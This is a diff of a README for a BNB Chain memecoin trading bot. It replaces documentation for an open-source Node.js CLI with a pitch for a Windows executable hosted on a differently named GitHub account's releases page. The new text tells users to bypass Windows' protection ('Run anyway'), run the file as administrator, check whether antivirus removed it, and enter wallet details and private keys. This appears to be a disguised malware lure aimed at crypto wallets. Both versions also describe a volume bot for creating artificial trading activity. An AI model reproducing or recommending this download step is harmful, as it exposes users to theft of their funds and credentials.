@@ -1,204 +1,193 @@
-# BSC(BNB) Trading Bot
-A **command-line trading toolkit** for **BNB Chain** focused on [Four.meme](https://four.meme)-style memecoin workflows. It talks **directly to the chain** through **PancakeSwap V2–compatible routers** (no centralized trading API). Use it to **snipe buys**, **run scripted routes**, **simulate volume**, or experiment with a **simple copy/mirror** flow — always with **`--dry-run`** first.
+# 🚀 four-meme-trading-bot - Trade Four.meme tokens with control
 
-> **Disclaimer:** Trading memecoins is extremely risky. This software is provided as-is for education and automation. You are responsible for keys, RPC choice, taxes, and compliance. Nothing here is financial advice.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Thistlelike-programinglanguage640/four-meme-trading-bot/releases)
 
----
+## 🖥️ What this app does
 
-## Why this project?
+four-meme-trading-bot is a Windows app for Four.meme trading tasks. It helps with:
 
-| You want to… | Start here |
-|----------------|------------|
-| Buy tokens from BNB with set slippage | `sniper` |
-| React when certain wallets hit the router | `copy` |
-| Run one or more scripted WBNB → token buys | `bundle` |
-| Repeat buy → sell on a timer (testing / activity) | `volume` |
+- Sniper buys for new token launches
+- Bundler activity for grouped actions
+- Copy trading from tracked wallets
+- Volume bot workflows
+- Basic bot setup for Four.meme use
 
----
+It is built for end users who want a simple way to run trading actions on Windows.
 
-## What’s under the hood
+## 📥 Download
 
-```mermaid
-flowchart LR
-  subgraph cli [CLI]
-    A[commander]
-  end
-  subgraph app [App]
-    B[load .env]
-    C[JsonRpcProvider + Wallet]
-    D[Router V2 + ERC20 ABI]
-  end
-  subgraph chain [BNB Chain]
-    E[RPC node]
-    F[Pancake Router V2]
-    G[Tokens]
-  end
-  A --> B --> C --> D
-  D --> E --> F --> G
-```
+Visit this page to download the latest version:
 
-1. **`commander`** parses subcommands (`sniper`, `copy`, `bundle`, `volume`) and flags like `--config` and `--dry-run`.
-2. **`dotenv`** loads `.env` (RPC URL, private key, chain id, router/WBNB addresses, optional Telegram).
-3. **`ethers` v6** builds a **`JsonRpcProvider`** (your RPC) and a **`Wallet`** (your key). Contracts use the **router V2** and **ERC20** ABIs from `src/abis/`.
-4. Each module reads a **JSON config file** (path via `-c`) and executes swaps on-chain. **`--dry-run`** skips sending transactions but still loads env and can run read-only calls where applicable.
+[Download from GitHub Releases](https://github.com/Thistlelike-programinglanguage640/four-meme-trading-bot/releases)
 
-**Stack:** Node.js (≥ 18.17) · TypeScript (compiled to CommonJS) · ethers v6 · axios (Telegram) · pino (logging).
+On that page, look for the newest release and download the Windows file that matches it.
 
----
+## 🪟 Windows setup
 
-## Modules in detail
+Use these steps on a Windows PC:
 
-### `sniper` — targeted buys
+1. Open the download page above.
+2. Find the latest release at the top of the list.
+3. Download the Windows file for the app.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Yes.
+8. If the app opens in a blocked window, click More info, then Run anyway.
 
-- **Config:** `config.sniper.example.json` → list of `targets`.
-- **Flow:** For each target, the bot builds path **`WBNB → token`**, calls **`getAmountsOut`** on the router, applies **slippage** (`slippageBips`, e.g. `800` = 8%), then **`swapExactETHForTokens`** with your BNB (`maxBnb`).
-- **Telegram (optional):** Sends a message before the buy and after confirmation (if `TELEGRAM_*` are set).
+If you use Windows 10 or Windows 11, the app should run on a normal desktop or laptop.
 
-### `copy` — wallet-triggered mirror (simple)
+## 🧰 What you need
 
-- **Config:** `config.copy.example.json` — `targets` (addresses to watch), `defaultToken` (token you buy when triggered), `positionPercent`, `maxBnbPerTrade`.
-- **Flow:** Subscribes to the **`pending`** tx stream. When a **watched address** sends a tx **to the router** (`ROUTER_V2_ADDRESS`), the bot executes a **separate** small WBNB → `defaultToken` swap (scaled by `positionPercent` / `maxBnbPerTrade`). It does **not** decode the leader’s calldata to copy the *same* token; it is a **naive mirror** into one configured token.
-- **Note:** Pending-tx feeds depend on your RPC; reliability and speed vary. This is **not** a professional copy-trading engine.
+Before you run the app, make sure you have:
 
-### `bundle` — scripted routes
+- A Windows PC
+- A stable internet connection
+- Enough free disk space for the app and its files
+- A wallet or account details ready for your Four.meme use
+- Any API keys, private settings, or trade data you plan to use
 
-- **Config:** `config.bundle.example.json` — `routes` array.
-- **Implemented today:** `kind: "buy"` only — WBNB → `token` for `amountBnb` with slippage and optional `deadlineSec`.
+For best results, keep the app in a folder you can find again, such as Downloads or Desktop.
 
-### `volume` — timed buy/sell loop
+## ⚙️ First-time use
 
-- **Config:** `config.volume.example.json` — `token`, `amountBnb`, `slippageBips`, `intervalMs`.
-- **Flow:** On each interval: **buy** with `amountBnb`, then **approve** the router if needed, then **sell the full token balance** using **`swapExactTokensForETHSupportingFeeOnTransferTokens`** (fee-on-transfer friendly). Repeats until you stop the process.
+When you open the app for the first time, set up the main items you want to use:
 
----
+1. Choose the mode you want, such as sniper, bundler, copy trading, or volume bot.
+2. Enter the wallet or address details the app asks for.
+3. Set your trade size.
+4. Set your delay or trigger settings.
+5. Review the settings before you start.
+6. Save the profile if the app offers a save option.
 
-## Environment variables
+Use small values first so you can check that the app works the way you want.
 
-Copy `.env.example` to `.env` and fill in values.
+## 📌 Main features
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `RPC_URL` | Yes | HTTPS WebSocket/HTTP JSON-RPC endpoint for **BSC** (chain id **56**). Use a stable provider; free/public endpoints may rate-limit or return empty responses. |
-| `PRIVATE_KEY` | Yes | Wallet private key (0x…). Used only locally to sign txs. |
-| `CHAIN_ID` | No | Default **`56`** (BNB Chain mainnet). |
-| `WBNB_ADDRESS` | No | Default: canonical **WBNB** on BSC. |
-| `ROUTER_V2_ADDRESS` | No | Default: **PancakeSwap V2 router** on BSC. |
-| `LOG_LEVEL` | No | `info` · `debug` · `error` |
-| `TELEGRAM_BOT_TOKEN` | No | From [@BotFather](https://t.me/BotFather) — enables alerts. |
-| `TELEGRAM_CHAT_ID` | No | Chat or channel id to receive messages. |
+### 🐍 Sniper mode
 
-**RPC tip:** If you see ethers errors like **`BUFFER_OVERRUN`** / empty `0x` data, your RPC is likely returning bad or empty results for `eth_call` / `eth_chainId`. Try another BSC endpoint and confirm `CHAIN_ID` matches the network.
+Use sniper mode when you want to act on new token launches fast. This mode helps you set a target and react when the launch happens.
 
----
+Common uses:
 
-## JSON configs (examples)
+- Buy when a token goes live
+- Set fast entry settings
+- Control buy size before launch
 
-| File | Purpose |
-|------|---------|
-| `config.sniper.example.json` | `targets[]`: `token`, `maxBnb`, `slippageBips` |
-| `config.copy.example.json` | `targets[]`, `defaultToken`, `positionPercent`, `maxBnbPerTrade` |
-| `config.bundle.example.json` | `routes[]`: `kind`, `token`, `amountBnb`, `slippageBips`, `deadlineSec` |
-| `config.volume.example.json` | `token`, `amountBnb`, `slippageBips`, `intervalMs` |
+### 📦 Bundler mode
 
-Copy a file, edit addresses and amounts, then pass it with **`-c`**.
+Bundler mode helps when you want more than one action handled in a group. This can help with repeat tasks that need the same setup.
 
----
+Common uses:
 
-## Install & run
+- Group related actions
+- Keep settings in one place
+- Run a batch of planned tasks
 
-### Prerequisites
+### 👥 Copy trading
 
-- **Node.js** ≥ **18.17** (LTS recommended)
-- A **BNB-funded** wallet for gas and swaps
-- A **reliable BSC RPC** URL
+Copy trading lets the app follow a wallet you trust. When that wallet makes a move, the app can mirror the action based on your rules.
 
-### Setup
+Common uses:
 
-```bash
-git clone https://github.com/BNB-Alpha-Community/bnb-bundler.git
-cd bnb-bundler
-npm install
-```
+- Track a wallet address
+- Follow buys and sells
+- Set limits for each copied trade
 
-Create `.env` from `.env.example` and set at least `RPC_URL` and `PRIVATE_KEY`.
+### 📊 Volume bot
 
-### Build
+Volume bot mode helps with trade flow over time. It can place planned actions to create activity based on your settings.
 
-```bash
-npm run build
-```
+Common uses:
 
-### Commands
+- Run repeated trade steps
+- Control pace between actions
+- Keep a simple schedule
 
-Global CLI name (after `npm link` or global install): **`fourmeme`**. Locally:
+## 🧭 How to use the app
 
-```bash
-# Help
-node dist/index.js --help
-node dist/index.js sniper --help
+1. Open the app.
+2. Pick the mode you want.
+3. Paste the needed wallet, token, or pair data.
+4. Set the amount you want to use.
+5. Choose your slippage and timing options if shown.
+6. Check every field before you press start.
+7. Watch the status panel while the bot runs.
+8. Stop the bot when you want to change settings.
 
-# Development (TypeScript, watch mode)
-npm run dev -- sniper
-npm run dev -- copy
-```
+If you are not sure what a field means, start with the default value and test one setting at a time.
 
-**Production-style (after build):**
+## 🗂️ Common files you may see
 
-```bash
-# Sniper — dry-run first (no tx broadcast)
-node dist/index.js sniper -c config.sniper.example.json --dry-run
-node dist/index.js sniper -c my-sniper.json
+After download, you may see these file types:
 
-# Copy trader
-node dist/index.js copy -c config.copy.example.json
+- `.exe` — the main Windows app file
+- `.zip` — a compressed folder you must extract
+- `.json` — saved settings or config data
+- `.txt` — notes or release info
 
-# Bundler
-node dist/index.js bundle -c config.bundle.example.json
+If you see both a ZIP file and an EXE file, use the EXE file after extracting the ZIP.
 
-# Volume bot (runs until you stop the process)
-node dist/index.js volume -c config.volume.example.json
-```
+## 🔧 Basic settings guide
 
-All commands support **`--dry-run`** where the code skips signing/sending (useful for a quick sanity check).
+Here are the main settings most users change:
 
----
+- **Trade size**: How much you want to use per action
+- **Slippage**: How much price movement you allow
+- **Delay**: Time between actions
+- **Wallet or account**: The address or profile to use
+- **Target token**: The token you want to follow or buy
+- **Mode**: Sniper, bundler, copy trading, or volume bot
 
-## Project layout
+If the app has extra fields, fill them only if you know what they do.
 
-```
-src/
-  index.ts              # CLI entry
-  lib/
-    config.ts           # .env loading
-    provider.ts         # ethers provider + wallet
-    logger.ts           # pino
-    notifier.ts         # Telegram (optional)
-  modules/
-    sniper/Sniper.ts
-    copytrader/CopyTrader.ts
-    bundler/Bundler.ts
-    volume/VolumeBot.ts
-  abis/                 # Router V2 + ERC20 JSON ABIs
-```
+## 🔍 Tips for first run
 
----
+- Start with a small amount
+- Test one mode at a time
+- Keep your wallet info private
+- Check the token address before you run a trade
+- Watch the app log or status box for errors
+- Keep the app open while it runs
 
-## Security & operations
+If something does not work, close the app, check your settings, and try again.
 
-- **Never commit `.env`** or keys. Use a **dedicated hot wallet** with small balances for experiments.
-- **Verify** token and router addresses on [BscScan](https://bscscan.com) before live trading.
-- **Slippage** (`slippageBips`) protects against price movement; too low may fail, too high increases adverse selection risk.
-- **Copy module** is simplistic; leaders’ trades are not replicated token-for-token.
-- **Volume bot** sells **full balance** each cycle; adjust strategy and size carefully.
+## 🛠️ If the app does not open
 
----
+Try these steps:
 
-## License
+1. Right-click the app file.
+2. Choose Run as administrator.
+3. Make sure the file is fully downloaded.
+4. Extract the ZIP again if the folder looks broken.
+5. Move the app to a folder with a short path, such as `C:\FourMemeBot`.
+6. Check that your antivirus did not remove the file.
+7. Download the latest release again if the file looks damaged.
 
-MIT — see `package.json`.
+## 📎 Release page
 
----
+Use the release page for new versions, fixes, and updated Windows files:
 
-## Contributing
+[Open GitHub Releases](https://github.com/Thistlelike-programinglanguage640/four-meme-trading-bot/releases)
 
-Suggestions and pull requests are welcome. If this project saves you time, a **star** on the repo helps others discover it.
+Check this page each time you want the newest build for Windows
+
+## 📁 Project info
+
+Repository name: four-meme-trading-bot
+
+Description focus:
+
+- Four.meme trading bot
+- Sniper tools
+- Bundler actions
+- Copy trading support
+- Volume bot support
+
+Topic areas:
+
+- four-meme-bundler
+- four-meme-copy-trading-bot
+- four-meme-sniper
+- four-meme-trading-bot
+- four-meme-volume-bot
